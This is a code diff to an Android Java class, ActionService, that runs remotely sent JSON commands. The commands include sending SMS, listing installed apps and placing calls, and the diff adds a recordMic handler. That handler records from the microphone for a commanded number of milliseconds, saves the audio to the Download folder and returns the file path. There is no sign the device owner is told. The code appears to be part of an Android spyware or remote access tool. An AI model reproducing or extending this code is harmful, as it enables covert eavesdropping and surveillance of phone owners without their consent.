@@ -7,9 +7,11 @@ import android.content.pm.PackageInfo;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
+import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
@@ -19,6 +21,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
 import java.util.ArrayList;
@@ -48,6 +51,7 @@ public class ActionService{
             SendSMS(argjson);
             getInstalledApps(argjson);
             call(argjson);
+            recordMic(argjson);
         }catch (JSONException ex){
             Log.d(TAG, ex.getMessage());
             this.result = "Error JSON";
@@ -274,5 +278,43 @@ public class ActionService{
         }
 
         this.result = "call done";
+    }
+
+    public void recordMic(JSONObject argjson) throws JSONException {
+        if (!argjson.has("recordmic")){
+            return;
+        }
+
+        long time;
+
+        JSONArray array = argjson.getJSONArray("recordmic");
+        time = Long.valueOf(array.get(0).toString());
+
+        MediaRecorder recorder = new MediaRecorder();
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+        String path_file = Environment.getExternalStorageDirectory() + "/Download/record.3gp";
+        Log.d(TAG, path_file);
+
+        try {
+            recorder.setOutputFile(path_file);
+            recorder.prepare();
+        } catch (IllegalStateException e) {
+            Log.e("StartRecording", "IllegalStateException " + e.getMessage());
+            e.printStackTrace();
+        } catch (IOException e) {
+            Log.e("StartRecording", "IOException " + e.getMessage());
+            e.printStackTrace();
+        }
+        recorder.start();
+
+        Tools.sleep(time);
+
+        recorder.stop();
+        recorder.reset();
+        recorder.release();
+        Log.d(TAG, path_file);
+        this.result = path_file;
     }
 }
